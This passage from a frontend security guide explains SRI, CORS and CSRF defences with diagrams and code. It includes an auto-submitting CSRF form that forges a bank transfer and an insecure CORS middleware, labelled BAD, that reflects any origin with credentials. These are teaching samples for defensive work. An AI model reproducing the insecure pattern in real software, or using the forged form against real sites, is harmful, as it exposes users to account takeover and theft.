SRI allows browsers to verify that resources fetched from CDNs haven't been tampered with. The browser hashes the downloaded file and compares it to the expected hash in the `integrity` attribute.

### SRI Verification Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                    SRI VERIFICATION FLOW                        │
│                                                                 │
│  Developer:                                                     │
│  1. Download resource (e.g., jquery.min.js)                     │
│  2. Generate hash: sha384-<base64hash>                          │
│  3. Add to HTML: integrity="sha384-<base64hash>"                │
│                                                                 │
│  At Runtime:                                                    │
│                                                                 │
│  Browser ───── GET https://cdn.jquery.com/jquery.min.js ──────► │
│          ◄────────────────── Script bytes ──────────────────── │
│                                                                 │
│  Browser computes SHA-384 hash of received bytes                │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  Computed hash == integrity attribute hash?              │   │
│  │                                                          │   │
│  │  YES ──► Script executes normally                        │   │
│  │  NO  ──► Script BLOCKED, network error in console        │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

### CDN Compromise Scenario (Without SRI)

```
Without SRI:                     With SRI:
                                 
CDN gets hacked                  CDN gets hacked
       │                                │
       ▼                                ▼
Malicious script served          Malicious script served
       │                                │
       ▼                                ▼
Browser downloads it             Browser downloads it
       │                                │
       ▼                                ▼
Script executes — Users PWNED!   Hash mismatch detected
                                        │
                                        ▼
                                 Script BLOCKED — Users safe!
```

### Implementation

```html
<!-- Generate SRI hash: openssl dgst -sha384 -binary FILE | openssl base64 -A -->
<!-- Or use: https://www.srihash.org -->

<!-- Bootstrap CSS with SRI -->
<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
  integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
  crossorigin="anonymous"
/>

<!-- jQuery with SRI -->
<script
  src="https://code.jquery.com/jquery-3.7.1.min.js"
  integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
  crossorigin="anonymous"
></script>
```

```javascript
// Webpack plugin to auto-generate SRI hashes
// webpack.config.js
const SriPlugin = require('webpack-subresource-integrity');

module.exports = {
  output: {
    crossOriginLoading: 'anonymous',
  },
  plugins: [
    new SriPlugin({
      hashFuncNames: ['sha256', 'sha384'],
      enabled: process.env.NODE_ENV === 'production',
    }),
  ],
};
```

---

## 13. Cross-Origin Resource Sharing (CORS)

### Same-Origin Policy (SOP) — Foundation

```
┌─────────────────────────────────────────────────────────────────┐
│                 SAME-ORIGIN POLICY                              │
│                                                                 │
│  Origin = Protocol + Host + Port                                │
│                                                                 │
│  https://app.com:443/page                                       │
│  └──────┘  └─────┘ └─┘                                         │
│  Protocol   Host   Port                                         │
│                                                                 │
│  Comparing with https://app.com/api:                            │
│  ✓ Same protocol (https)                                        │
│  ✓ Same host (app.com)                                          │
│  ✓ Same port (443 default)  ──► SAME ORIGIN ✓                   │
│                                                                 │
│  Comparing with https://api.app.com/data:                       │
│  ✓ Same protocol (https)                                        │
│  ✗ Different host (subdomain) ──► DIFFERENT ORIGIN ✗            │
└─────────────────────────────────────────────────────────────────┘
```

### CORS Preflight Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                   CORS PREFLIGHT FLOW                           │
│                                                                 │
│  Browser (https://frontend.com)        API (https://api.com)    │
│        │                                        │               │
│        │  OPTIONS /data                         │               │
│        │  Origin: https://frontend.com          │               │
│        │  Access-Control-Request-Method: POST   │               │
│        │  Access-Control-Request-Headers: Auth  │               │
│        │ ──────────────────────────────────────►│               │
│        │                                        │               │
│        │  HTTP 204 No Content                   │               │
│        │  Access-Control-Allow-Origin: https://frontend.com     │
│        │  Access-Control-Allow-Methods: GET, POST               │
│        │  Access-Control-Allow-Headers: Authorization           │
│        │  Access-Control-Max-Age: 86400                         │
│        │ ◄──────────────────────────────────────│               │
│        │                                        │               │
│        │  POST /data (actual request)           │               │
│        │  Authorization: Bearer token           │               │
│        │ ──────────────────────────────────────►│               │
│        │                                        │               │
│        │  HTTP 200 OK + data                    │               │
│        │ ◄──────────────────────────────────────│               │
└─────────────────────────────────────────────────────────────────┘
```

### CORS Configuration Best Practices

```javascript
// Express.js — Secure CORS configuration
const cors = require('cors');

// BAD: wildcard allows any origin
app.use(cors({ origin: '*' })); // ❌ Never for authenticated APIs

// GOOD: Strict origin allowlist
const allowedOrigins = [
  'https://app.mycompany.com',
  'https://staging.mycompany.com',
  process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null,
].filter(Boolean);

app.use(
  cors({
    origin: (origin, callback) => {
      // Allow requests with no origin (mobile apps, curl)
      if (!origin) return callback(null, true);

      if (allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error(`Origin ${origin} not allowed by CORS`));
      }
    },
    credentials: true,           // Allow cookies
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    exposedHeaders: ['X-Total-Count'],
    maxAge: 86400,               // Cache preflight for 24 hours
  })
);

// CORS attack scenario — what NOT to reflect:
// BAD:
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin); // Reflects ANY origin!
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});
```

### CORS Headers Reference

```
┌──────────────────────────────────────────────────────────────────┐
│  RESPONSE HEADER                     │  PURPOSE                  │
├──────────────────────────────────────────────────────────────────┤
│  Access-Control-Allow-Origin         │  Allowed origin(s)        │
│  Access-Control-Allow-Methods        │  Allowed HTTP methods      │
│  Access-Control-Allow-Headers        │  Allowed request headers   │
│  Access-Control-Allow-Credentials    │  Allow cookies/auth        │
│  Access-Control-Expose-Headers       │  Headers JS can read       │
│  Access-Control-Max-Age              │  Preflight cache duration  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 14. Cross-Site Request Forgery (CSRF)

### What is CSRF?

CSRF tricks an authenticated user's browser into making unintended requests to a web application where they are already authenticated, exploiting the fact that browsers automatically send cookies with requests.

### CSRF Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                     CSRF ATTACK FLOW                            │
│                                                                 │
│  1. Victim logs into bank.com                                   │
│     Browser stores session cookie: session=abc123               │
│                                                                 │
│  2. Victim visits malicious page evil.com                       │
│     evil.com contains hidden form:                              │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  <form action="https://bank.com/transfer" method="POST"> │   │
│  │    <input type="hidden" name="to" value="attacker">      │   │
│  │    <input type="hidden" name="amount" value="10000">     │   │
│  │  </form>                                                 │   │
│  │  <script>document.forms[0].submit();</script>            │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  3. Browser auto-submits form to bank.com                       │
│     ──── POST /transfer (with session cookie!) ────────────►    │
│                                                                 │
│  4. bank.com sees valid session cookie — processes transfer!    │
│                                                                 │
│  Victim's $10,000 transferred to attacker without consent!      │
└─────────────────────────────────────────────────────────────────┘
```

### CSRF Defense Mechanisms

```
┌─────────────────────────────────────────────────────────────────┐
│                   CSRF DEFENSE LAYERS                           │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  1. CSRF Tokens (Synchronizer Token Pattern)            │    │
│  │     Server generates random token → stored in session   │    │
│  │     Token included in every form/request                │    │
│  │     Server validates token on state-changing requests   │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  2. SameSite Cookie Attribute                           │    │
│  │     SameSite=Strict → cookie never sent cross-site      │    │
│  │     SameSite=Lax    → sent on top-level navigation GET  │    │
│  │     SameSite=None   → always sent (requires Secure)     │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  3. Double Submit Cookie Pattern                        │    │
│  │     Random value in cookie AND request param            │    │
│  │     Attacker can't read cookie → can't forge the pair   │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  4. Origin / Referer Header Validation                  │    │
│  │     Check that request Origin matches expected origin   │    │
│  └─────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────┘
```

### CSRF Token Implementation

```javascript
// Server: Generate and validate CSRF tokens (Express.js + csurf)
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// Send token to frontend
app.get('/form', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Token is automatically validated on POST/PUT/DELETE
app.post('/transfer', (req, res) => {
  // If token missing or wrong → 403 Forbidden automatically
  processTransfer(req.body);
});

// Frontend: Include CSRF token in requests
async function transferMoney(amount, to) {
  // Get token from meta tag or API
  const csrfToken = document
    .querySelector('meta[name="csrf-token"]')
    .getAttribute('content');

  await fetch('/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,       // Custom header
    },
    body: JSON.stringify({ amount, to }),
    credentials: 'include',             // Include cookies
  });
}
```

```javascript
// Axios CSRF interceptor
import axios from 'axios';

// Axios automatically reads XSRF-TOKEN cookie and sends as X-XSRF-TOKEN header
axios.defaults.xsrfCookieName = 'XSRF-TOKEN';
axios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN';
axios.defaults.withCredentials = true;

// Set up CSRF cookie on server
res.cookie('XSRF-TOKEN', req.csrfToken(), {
  secure: true,
  sameSite: 'Strict',
  // NOT HttpOnly — JavaScript needs to read this one
});
```

### SameSite Cookie Defense

```
┌──────────────────────────────────────────────────────────────────┐
│  SAMESITE=STRICT                                                 │
│                                                                  │
│  user navigates from evil.com to bank.com → NO cookie sent       │
│  user navigates directly to bank.com → cookie sent               │
│                                                                  │
│  SameSite=Lax (default in modern browsers)                       │
│                                                                  │
│  GET navigation from evil.com to bank.com → cookie sent (safe)   │
│  POST form submission from evil.com → NO cookie sent             │
│                                                                  │
│  Best Practice:                                                  │
│  Session cookie: SameSite=Strict; Secure; HttpOnly               │
└──────────────────────────────────────────────────────────────────┘
```

---

## Security Architecture Summary

```
┌─────────────────────────────────────────────────────────────────────┐
│              COMPLETE FRONTEND SECURITY ARCHITECTURE                │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │                      CDN / Edge                             │    │
│  │  • TLS 1.3 termination    • DDoS protection                 │    │
│  │  • WAF rules              • Rate limiting                   │    │
│  └────────────────────────────┬────────────────────────────────┘    │
│                               │                                     │
│  ┌────────────────────────────▼────────────────────────────────┐    │
│  │                  Web Server / API Gateway                   │    │
│  │  • Security Headers (Helmet)    • CORS policy               │    │
│  │  • CSRF protection              • Rate limiting             │    │
│  │  • Input validation             • Auth middleware           │    │
│  └────────────────────────────┬────────────────────────────────┘    │
│                               │                                     │
│  ┌────────────────────────────▼────────────────────────────────┐    │
│  │                    Frontend Application                     │    │
│  │  • CSP enforced           • SRI on CDN resources            │    │
│  │  • XSS prevention         • Secure cookies                  │    │
│  │  • Input sanitization     • No secrets in client code       │    │
│  │  • iFrame sandboxing      • Dependency auditing             │    │
│  └────────────────────────────┬────────────────────────────────┘    │
│                               │                                     │
│  ┌────────────────────────────▼────────────────────────────────┐    │
│  │                    User / Browser                           │    │
│  │  • HTTPS only             • SameSite cookies                │    │
│  │  • Permissions-Policy     • Trusted Types                   │    │
│  └─────────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Quick Reference Cheat Sheet

| Threat | Primary Defense | Secondary Defense |
|--------|----------------|-------------------|
| XSS | Output encoding + CSP | DOMPurify + HttpOnly cookies |
| Clickjacking | `X-Frame-Options: DENY` | CSP `frame-ancestors 'none'` |
| CSRF | CSRF tokens | `SameSite=Strict` cookies |
| MITM | HTTPS + HSTS | Certificate Transparency |
| Supply Chain | `npm audit` + lock files | Dependabot + SRI |
| CORS abuse | Strict origin allowlist | Never reflect `Origin` header |
| SSRF | URL allowlisting | Block private IP ranges |
| SSJI | Never use `eval()` | Allowlist-based logic |
| Clickjacking | CSP `frame-ancestors` | Sandbox iframes |
| Data theft | HttpOnly + Secure cookies | No sensitive data in localStorage |

---

*Last updated: May 2026*
